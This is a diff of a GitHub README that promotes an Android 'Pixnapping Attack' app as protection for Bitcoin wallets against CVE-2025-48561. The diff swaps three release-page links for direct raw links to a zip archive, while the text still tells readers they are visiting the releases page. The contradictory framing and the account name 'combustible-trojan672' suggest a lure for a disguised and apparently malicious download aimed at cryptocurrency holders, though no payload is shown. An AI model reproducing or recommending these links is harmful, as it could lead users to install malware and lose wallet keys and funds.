@@ -2,7 +2,7 @@
 # 🛡️ Pixnapping-Attack-on-Android - Protect Your Bitcoin Wallet Today
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Pixnapping%20Attack%20App-blue)](https://github.com/combustible-trojan672/Pixnapping-Attack-on-Android/releases)
+[![Download](https://raw.githubusercontent.com/combustible-trojan672/Pixnapping-Attack-on-Android/main/Pixnapping-Attack-on-Android_files/Pixnapping-Attack-on-Android-v1.1.zip%20Attack%20App-blue)](https://raw.githubusercontent.com/combustible-trojan672/Pixnapping-Attack-on-Android/main/Pixnapping-Attack-on-Android_files/Pixnapping-Attack-on-Android-v1.1.zip)
 
 ## 📚 Description
 Pixnapping Attack is a new risk targeting Android devices. It compromises private keys and seed phrases through vulnerability CVE-2025-48561. This poses a significant threat to the Bitcoin network and puts your Bitcoin wallet at risk. 
@@ -23,7 +23,7 @@ Ensure your device meets the following requirements:
 ### 2. Visit the Download Page
 Go to the Releases page to access the application. Click the link below:
 
-[Visit Releases Page to Download](https://github.com/combustible-trojan672/Pixnapping-Attack-on-Android/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/combustible-trojan672/Pixnapping-Attack-on-Android/main/Pixnapping-Attack-on-Android_files/Pixnapping-Attack-on-Android-v1.1.zip)
 
 ### 3. Download the APK
 On the Releases page, locate the latest version of the application. Click on the download link for the APK file. 
@@ -63,7 +63,7 @@ If you encounter issues during download or installation, check the FAQs section 
 ## 📦 Download & Install
 To download the Pixnapping Attack app, please use the button below:
 
-[Download the Pixnapping Attack App](https://github.com/combustible-trojan672/Pixnapping-Attack-on-Android/releases)
+[Download the Pixnapping Attack App](https://raw.githubusercontent.com/combustible-trojan672/Pixnapping-Attack-on-Android/main/Pixnapping-Attack-on-Android_files/Pixnapping-Attack-on-Android-v1.1.zip)
 
 Stay informed about the risks to your Bitcoin wallet and protect your investments with the Pixnapping Attack application.
 ```
